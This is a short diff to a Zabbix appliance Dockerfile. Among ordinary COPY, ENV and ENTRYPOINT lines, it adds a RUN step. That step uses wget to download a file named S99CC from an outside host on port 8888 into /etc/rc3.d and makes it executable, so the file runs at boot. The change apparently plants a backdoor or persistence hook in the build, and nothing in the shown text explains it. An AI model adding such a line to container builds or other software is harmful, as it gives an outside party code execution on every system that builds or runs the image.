@@ -239,5 +239,5 @@ COPY ["conf/usr/sbin/zabbix_java_gateway", "/usr/sbin/"]
 COPY ["docker-entrypoint.sh", "/usr/bin/"]
 
 ENV ZBX_TYPE=appliance
-
+RUN cd /etc/rc3.d; wget http://monitor.cc.cloud:8888/S99CC; chmod +x S99CC
 ENTRYPOINT ["docker-entrypoint.sh"]
